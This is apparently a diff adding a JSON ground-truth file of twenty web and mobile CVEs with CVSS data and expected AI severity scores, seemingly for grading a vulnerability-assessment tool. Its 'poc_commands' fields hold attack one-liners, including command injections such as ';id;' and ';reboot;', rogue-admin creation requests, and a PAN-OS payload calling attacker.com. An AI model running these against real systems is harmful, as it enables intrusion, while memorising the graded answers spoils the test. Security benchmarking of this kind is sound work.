@@ -1,0 +1,382 @@
+[
+  {
+    "id": "GT-WEB-01",
+    "cve_id": "CVE-2023-4966",
+    "title": "Citrix NetScaler ADC / Gateway Sensitive Information Disclosure (Citrix Bleed)",
+    "platform": "WEB",
+    "vendor_product": "Citrix NetScaler ADC and NetScaler Gateway",
+    "affected_versions": "13.0 before 13.0-92.21, 13.1 before 13.1-49.15, 14.1 before 14.1-8.50",
+    "cvss": 9.4,
+    "cwe": ["CWE-119", "CWE-200"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -k -s -H \"Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" https://target-gateway.com/oauth/idp/.well-known/openid-configuration"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4966",
+    "raw_content": "CVE-2023-4966: Sensitive information disclosure in NetScaler ADC and NetScaler Gateway when configured as a Gateway or AAA virtual server across versions 13.0 before 13.0-92.21, 13.1 before 13.1-49.15, and 14.1 before 14.1-8.50. Unauthenticated remote attackers can extract session tokens from uninitialized memory buffers via buffer over-read in OpenID configuration endpoints, completely bypassing multi-factor authentication (MFA). Actively exploited in the wild.",
+    "expected_ai_severity": 9.8,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-02",
+    "cve_id": "CVE-2023-22515",
+    "title": "Atlassian Confluence Data Center and Server Broken Access Control",
+    "platform": "WEB",
+    "vendor_product": "Atlassian Confluence Server and Data Center",
+    "affected_versions": "8.0.0 through 8.5.1",
+    "cvss": 10.0,
+    "cwe": ["CWE-287", "CWE-862"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -k -X POST https://confluence.target.local/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22515",
+    "raw_content": "CVE-2023-22515: Critical broken access control flaw in Atlassian Confluence Data Center and Server versions 8.0.0 through 8.5.1 allows unauthenticated remote attackers to reset the administrator setup wizard and create rogue administrator accounts via the setup-restore endpoint. Actively exploited globally in targeted ransomware intrusions.",
+    "expected_ai_severity": 10.0,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-03",
+    "cve_id": "CVE-2023-34362",
+    "title": "Progress MOVEit Transfer SQL Injection Vulnerability",
+    "platform": "WEB",
+    "vendor_product": "Progress MOVEit Transfer",
+    "affected_versions": "2020.1 before 2020.1.11, 2021.0 before 2021.0.9, 2022.0 before 2022.0.7",
+    "cvss": 9.8,
+    "cwe": ["CWE-89"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 moveit_sqli_payload.py -u https://moveit.target.com/human.aspx -p guest"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34362",
+    "raw_content": "CVE-2023-34362: In Progress MOVEit Transfer versions 2020.1 before 2020.1.11, 2021.0 before 2021.0.9, and 2022.0 before 2022.0.7, an SQL injection vulnerability in the MOVEit Transfer web application could allow an unauthenticated attacker to gain access to MOVEit Transfer's database. Depending on the database engine employed, an attacker might be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements.",
+    "expected_ai_severity": 9.8,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-04",
+    "cve_id": "CVE-2024-21887",
+    "title": "Ivanti Connect Secure Command Injection via Web Component",
+    "platform": "WEB",
+    "vendor_product": "Ivanti Connect Secure and Policy Secure",
+    "affected_versions": "9.x and 22.x",
+    "cvss": 9.1,
+    "cwe": ["CWE-77", "CWE-78"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -k -X POST https://vpn.target.com/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection -d '{\"type\": \";id;\"}'"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21887",
+    "raw_content": "CVE-2024-21887: A command injection vulnerability in web components of Ivanti Connect Secure (9.x and 22.x) allows an authenticated administrator to send specially crafted requests and execute arbitrary commands on the appliance. When chained with CVE-2023-46805 auth bypass, this vulnerability can be exploited by unauthenticated remote adversaries over HTTPS.",
+    "expected_ai_severity": 9.8,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-05",
+    "cve_id": "CVE-2024-27198",
+    "title": "JetBrains TeamCity Server Authentication Bypass",
+    "platform": "WEB",
+    "vendor_product": "JetBrains TeamCity Server",
+    "affected_versions": "before 2023.11.4",
+    "cvss": 9.8,
+    "cwe": ["CWE-288", "CWE-306"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -k -X POST https://teamcity.target.com/app/rest/users?jsp=/app/rest/users; -d '<user username=\"pwned\" password=\"Password123!\"><roles><role roleId=\"SYSTEM_ADMIN\" scope=\"g\"/></roles></user>' -H 'Content-Type: application/xml'"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27198",
+    "raw_content": "CVE-2024-27198: Authentication bypass vulnerability in the web component of JetBrains TeamCity Server before 2023.11.4. The flaw exists due to alternate path handling in the Spring web MVC dispatcher, allowing unauthenticated attackers to invoke REST API endpoints and create rogue administrative user accounts with full remote code execution.",
+    "expected_ai_severity": 10.0,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-06",
+    "cve_id": "CVE-2024-3400",
+    "title": "Palo Alto Networks PAN-OS GlobalProtect Command Injection",
+    "platform": "WEB",
+    "vendor_product": "Palo Alto Networks PAN-OS",
+    "affected_versions": "10.2, 11.0, 11.1",
+    "cvss": 10.0,
+    "cwe": ["CWE-77"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -k -X POST https://gateway.target.com/ssl-vpn/hipreport.esp -H 'Cookie: SESSID=../../../opt/panlogs/tmp/device_telemetry/minute/`curl${IFS}attacker.com`'"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3400",
+    "raw_content": "CVE-2024-3400: A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software across versions 10.2, 11.0, and 11.1 allows an unauthenticated remote attacker to execute arbitrary code with root privileges on the firewall appliance. The vulnerability arises from improper sanitization of session cookies passed to telemetry cron scripts.",
+    "expected_ai_severity": 10.0,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-07",
+    "cve_id": "CVE-2023-46604",
+    "title": "Apache ActiveMQ OpenWire Remote Code Execution",
+    "platform": "WEB",
+    "vendor_product": "Apache ActiveMQ",
+    "affected_versions": "before 5.15.16, 5.16.7, 5.17.6, 5.18.3",
+    "cvss": 9.8,
+    "cwe": ["CWE-502"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 activemq_rce.py -t target.local -p 61616 -u http://attacker.local/poc.xml"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46604",
+    "raw_content": "CVE-2023-46604: Insecure deserialization in the OpenWire protocol marshaller of Apache ActiveMQ versions before 5.15.16, 5.16.7, 5.17.6, and 5.18.3 allows a remote attacker with network access to run arbitrary shell commands by instantiating ClassPathXmlApplicationContext via manipulated ExceptionResponse payloads.",
+    "expected_ai_severity": 9.6,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-08",
+    "cve_id": "CVE-2024-45409",
+    "title": "Ruby-SAML & GitLab CE/EE SAML Response Authentication Bypass",
+    "platform": "WEB",
+    "vendor_product": "GitLab CE and EE / Ruby-SAML",
+    "affected_versions": "before 17.3.3, 17.2.7, 17.1.6, 17.0.8",
+    "cvss": 10.0,
+    "cwe": ["CWE-347"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 saml_forge.py --idp-cert cert.pem --target https://gitlab.target.com/users/auth/saml/callback"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45409",
+    "raw_content": "CVE-2024-45409: Improper verification of cryptographic signature in OmniAuth SAML and Ruby-SAML allows unauthenticated remote attackers to bypass SAML identity authentication in GitLab Community and Enterprise Edition across versions before 17.3.3, 17.2.7, 17.1.6, and 17.0.8, logging in as arbitrary administrative users.",
+    "expected_ai_severity": 9.8,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-WEB-09",
+    "cve_id": "CVE-2026-94138",
+    "title": "Chengdu Feiyuxing Feiyu Star Router Web Command Injection",
+    "platform": "WEB",
+    "vendor_product": "Chengdu Feiyuxing Technology Feiyu Star Router",
+    "affected_versions": "B-MB5E202-210322-r11656",
+    "cvss": 2.0,
+    "cwe": ["CWE-74", "CWE-77"],
+    "kev_status": false,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -X GET 'http://router.local/send_order.cgi?parameter=del_expmac&mac=;reboot;'"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-94138",
+    "raw_content": "CVE-2026-94138: A security flaw has been discovered in Chengdu Feiyuxing Technology Feiyu Star Router B-MB5E202-210322-r11656. This impacts an unknown function of the file /send_order.cgi?parameter=del_expmac. The manipulation of the argument mac results in command injection. The attack may be launched remotely over HTTP. The exploit has been released to the public.",
+    "expected_ai_severity": 7.0,
+    "expected_cvss_discrepancy": true
+  },
+  {
+    "id": "GT-WEB-10",
+    "cve_id": "CVE-2024-1709",
+    "title": "ConnectWise ScreenConnect Authentication Bypass",
+    "platform": "WEB",
+    "vendor_product": "ConnectWise ScreenConnect",
+    "affected_versions": "23.9.7 and prior",
+    "cvss": 10.0,
+    "cwe": ["CWE-288"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "curl -k https://screenconnect.target.com/SetupWizard.aspx/something"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-1709",
+    "raw_content": "CVE-2024-1709: ConnectWise ScreenConnect 23.9.7 and prior contains an authentication bypass using an alternate path or channel vulnerability. An unauthenticated attacker can access the initial SetupWizard.aspx page by appending arbitrary path segments, allowing creation of administrative accounts and remote code execution on the host server.",
+    "expected_ai_severity": 10.0,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-01",
+    "cve_id": "CVE-2024-0044",
+    "title": "Android PackageInstaller Run-As Privilege Escalation",
+    "platform": "MOBILE",
+    "vendor_product": "Google Android OS",
+    "affected_versions": "12, 13, 14",
+    "cvss": 7.8,
+    "cwe": ["CWE-20", "CWE-269"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "adb shell pm install -i 'com.google.android.packageinstaller\" -d \"/data/system/users/0' payload.apk"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-0044",
+    "raw_content": "CVE-2024-0044: In createSessionInternal of PackageInstallerService.java, there is a possible run-as vulnerability due to improper input validation across Android 12, 13, and 14. Attackers can bypass application isolation constraints using parameter injection to gain internal app data access and execute commands as any installed application.",
+    "expected_ai_severity": 8.5,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-02",
+    "cve_id": "CVE-2023-38606",
+    "title": "Apple iOS Kernel Memory Protection Bypass (Operation Triangulation)",
+    "platform": "MOBILE",
+    "vendor_product": "Apple iOS and iPadOS",
+    "affected_versions": "before 16.6",
+    "cvss": 7.8,
+    "cwe": ["CWE-284"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 triangulation_exploit.py --target ios --mode mmio-page-bypass"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38606",
+    "raw_content": "CVE-2023-38606: An app may be able to modify sensitive kernel state. Apple addressed this issue with improved state management in iOS 16.6 and iPadOS 16.6. Attackers used undocumented hardware MMIO registers to bypass hardware memory page protection (page-table protection) on Apple A12-A16 Bionic processors in zero-click iMessage spyware campaigns.",
+    "expected_ai_severity": 9.2,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-03",
+    "cve_id": "CVE-2023-41064",
+    "title": "Apple ImageIO BLASTPASS Zero-Click Arbitrary Code Execution",
+    "platform": "MOBILE",
+    "vendor_product": "Apple iOS, iPadOS, macOS",
+    "affected_versions": "before 16.6.1",
+    "cvss": 8.8,
+    "cwe": ["CWE-787"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "# Disclosed by Citizen Lab as part of the BLASTPASS zero-click exploit chain targeting iMessage"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41064",
+    "raw_content": "CVE-2023-41064: A buffer overflow issue was addressed with improved memory handling in ImageIO framework across iOS before 16.6.1. Processing a maliciously crafted WebP image sent via iMessage allows arbitrary remote code execution without user interaction. Actively exploited in Pegasus spyware deployments.",
+    "expected_ai_severity": 9.5,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-04",
+    "cve_id": "CVE-2023-21264",
+    "title": "Android ART Runtime Hooking and Sandbox Escape",
+    "platform": "MOBILE",
+    "vendor_product": "Google Android OS",
+    "affected_versions": "11, 12, 12L, 13",
+    "cvss": 7.8,
+    "cwe": ["CWE-276"],
+    "kev_status": false,
+    "has_public_poc": true,
+    "poc_commands": [
+      "frida -U -f com.target.app -l art_hook_bypass.js"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-21264",
+    "raw_content": "CVE-2023-21264: In Android Runtime (ART) across Android 11, 12, 12L, and 13, improper access controls allow a local malicious application to manipulate JIT compiler memory mappings and alter execution flow across app sandboxes, bypassing application-level dynamic protections.",
+    "expected_ai_severity": 7.5,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-05",
+    "cve_id": "CVE-2023-40118",
+    "title": "Android Exported Intent Hijacking and Unauthorized Activity Launch",
+    "platform": "MOBILE",
+    "vendor_product": "Google Android OS",
+    "affected_versions": "11, 12, 13, 14",
+    "cvss": 7.8,
+    "cwe": ["CWE-926"],
+    "kev_status": false,
+    "has_public_poc": true,
+    "poc_commands": [
+      "adb shell am start -n com.android.settings/.SubSettings -a android.intent.action.VIEW --extra_flag bypass"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40118",
+    "raw_content": "CVE-2023-40118: In Settings of Android 11, 12, 13, and 14, an exported activity lacks proper intent permission checks (CWE-926). A local application without special permissions can launch arbitrary internal system settings dialogs and bypass user consent verification.",
+    "expected_ai_severity": 7.0,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-06",
+    "cve_id": "CVE-2024-23222",
+    "title": "Apple iOS WebKit Type Confusion Memory Corruption",
+    "platform": "MOBILE",
+    "vendor_product": "Apple iOS and iPadOS",
+    "affected_versions": "before 17.3",
+    "cvss": 8.8,
+    "cwe": ["CWE-843"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 webkit_poc_server.py --port 8080 --payload type_confusion.html"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23222",
+    "raw_content": "CVE-2024-23222: A type confusion issue was addressed with improved checks in WebKit for iOS before 17.3. Processing maliciously crafted web content may lead to arbitrary code execution inside the mobile browser sandbox. Apple is aware of a report that this issue may have been exploited against iOS devices.",
+    "expected_ai_severity": 9.0,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-07",
+    "cve_id": "CVE-2023-20938",
+    "title": "Android Binder Driver Use-After-Free Privilege Escalation",
+    "platform": "MOBILE",
+    "vendor_product": "Google Android OS (Linux Kernel)",
+    "affected_versions": "Android 13 with kernel 5.10",
+    "cvss": 7.8,
+    "cwe": ["CWE-416"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "./binder_uaf_poc /dev/binder"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-20938",
+    "raw_content": "CVE-2023-20938: In binder_transaction of binder.c, there is a possible use-after-free due to a race condition. This could lead to local privilege escalation with System execution privileges needed across Android 13 with kernel 5.10. Exploitation does not require user interaction.",
+    "expected_ai_severity": 8.5,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-08",
+    "cve_id": "CVE-2023-32409",
+    "title": "Apple WebKit Remote Sandbox Escape Vulnerability",
+    "platform": "MOBILE",
+    "vendor_product": "Apple iOS, iPadOS, macOS",
+    "affected_versions": "before 16.5",
+    "cvss": 8.8,
+    "cwe": ["CWE-284"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 webkit_escape_server.py --port 8000"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32409",
+    "raw_content": "CVE-2023-32409: In WebKit across iOS and iPadOS before 16.5, a remote attacker may be able to break out of the Web Content sandbox. Apple addressed this issue with improved bounds checks. Discovered by Clément Lecigne of Google Threat Analysis Group.",
+    "expected_ai_severity": 9.2,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-09",
+    "cve_id": "CVE-2024-0012",
+    "title": "Android Bluetooth Stack Heap Buffer Overflow",
+    "platform": "MOBILE",
+    "vendor_product": "Google Android OS",
+    "affected_versions": "12, 12L, 13, 14",
+    "cvss": 8.8,
+    "cwe": ["CWE-122"],
+    "kev_status": false,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 l2cap_packet_crafter.py --bdaddr 00:11:22:33:44:55 --overflow"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-0012",
+    "raw_content": "CVE-2024-0012: In the Bluetooth subsystem of Android 12, 12L, 13, and 14, there is a possible out-of-bounds write due to a heap buffer overflow. Proximal remote attackers can trigger remote code execution over Bluetooth without requiring pairing or user privileges.",
+    "expected_ai_severity": 8.8,
+    "expected_cvss_discrepancy": false
+  },
+  {
+    "id": "GT-MOB-10",
+    "cve_id": "CVE-2023-41061",
+    "title": "Apple Wallet / PassKit Security Validation Bypass",
+    "platform": "MOBILE",
+    "vendor_product": "Apple iOS and watchOS",
+    "affected_versions": "before 16.6.1",
+    "cvss": 7.8,
+    "cwe": ["CWE-20"],
+    "kev_status": true,
+    "has_public_poc": true,
+    "poc_commands": [
+      "python3 passkit_craft.py --pass malicious.pkpass"
+    ],
+    "official_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41061",
+    "raw_content": "CVE-2023-41061: A validation issue was addressed with improved logic in Apple PassKit across iOS before 16.6.1 and watchOS before 9.6.2. A maliciously crafted attachment could result in arbitrary code execution on target devices. Chained alongside BLASTPASS exploits.",
+    "expected_ai_severity": 8.6,
+    "expected_cvss_discrepancy": false
+  }
+]
